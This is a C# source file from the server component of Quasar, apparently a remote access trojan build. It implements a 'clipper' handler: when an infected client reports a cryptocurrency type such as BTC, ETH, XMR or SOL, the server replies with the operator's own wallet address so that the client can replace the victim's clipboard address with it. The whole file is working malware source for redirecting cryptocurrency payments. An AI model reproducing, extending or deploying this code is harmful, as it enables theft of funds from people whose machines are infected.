using Quasar.Common.Enums;
using Quasar.Common.Messages;
using Quasar.Common.Messages.Monitoring.Clipboard;
using Quasar.Common.Messages.other;
using Quasar.Common.Messages.UserSupport.MessageBox;
using Quasar.Common.Networking;
using Quasar.Server.Forms;
using Quasar.Server.Networking;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text.Json;
using System.Windows.Forms;

namespace Quasar.Server.Messages
{
    /// <summary>
    /// Handles messages for the interaction with the remote client status.
    /// </summary>
    public class GetCryptoAddress : MessageProcessorBase<object>
    {
        public delegate void AddressReceivedEventHandler(object sender, Client client, string addressType);

        public event AddressReceivedEventHandler AddressReceived;

        /// <summary>
        /// Initializes a new instance of the <see cref="GetCryptoAddress"/> class.
        /// </summary>
        public GetCryptoAddress() : base(true)
        {
        }



        /// <inheritdoc />
        public override bool CanExecute(IMessage message) => message is DoGetAddress;

        /// <inheritdoc />
        public override bool CanExecuteFrom(ISender sender) => true;

        /// <inheritdoc />
        public override void Execute(ISender sender, IMessage message)
        {
            if (message is DoGetAddress addressMessage)
            {
                Execute((Client)sender, addressMessage);
            }
        }
        private void Execute(Client client, DoGetAddress message)
        {

            AddressReceived?.Invoke(this, client, message.Type);

            FrmMain frm = Application.OpenForms["FrmMain"] as FrmMain;
            if (frm != null && frm.ClipperCheckbox.Checked)
            {
                var addressGetters = new Dictionary<string, Func<string>>
                {
                    { "BTC", frm.GetBTCAddress },
                    { "LTC", frm.GetLTCAddress },
                    { "ETH", frm.GetETHAddress }, 
                    { "XMR", frm.GetXMRAddress },
                    { "SOL", frm.GetSOLAddress },
                    { "DASH", frm.GetDASHAddress },
                    { "XRP", frm.GetXRPAddress },
                    { "TRX", frm.GetTRXAddress },
                    { "BCH", frm.GetBCHAddress }
                };

                if (!string.IsNullOrEmpty(message.Type) && addressGetters.TryGetValue(message.Type, out var getAddress))
                {
                    client.Send(new DoSendAddress
                    {
                        Address = getAddress()
                    });
                }
            }
        }
    }
}
